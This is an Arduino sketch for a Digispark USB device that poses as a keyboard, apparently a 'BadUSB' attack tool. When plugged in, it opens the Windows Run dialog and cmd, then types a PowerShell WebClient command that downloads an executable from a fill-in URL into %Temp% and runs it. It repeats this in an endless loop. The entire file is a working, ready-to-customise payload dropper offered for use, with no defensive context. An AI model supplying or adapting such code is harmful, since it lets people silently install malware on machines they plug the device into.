#include "DigiKeyboard.h"
#define MOD_SHIFT_LEFT      (1<<1)
#define MOD_ALT_LEFT        (1<<2)
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
delay(1000);
DigiKeyboard.print("");
delay(1000);
DigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT, MOD_ALT_LEFT);
delay(1000);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
delay(1000);
DigiKeyboard.print("cmd");
delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(500);
DigiKeyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('link on your file','%Temp%/yourfile.exe')");
delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(500);
DigiKeyboard.print("%Temp%/yourfile.exe");
delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
delay(500);
DigiKeyboard.print("exit");
delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

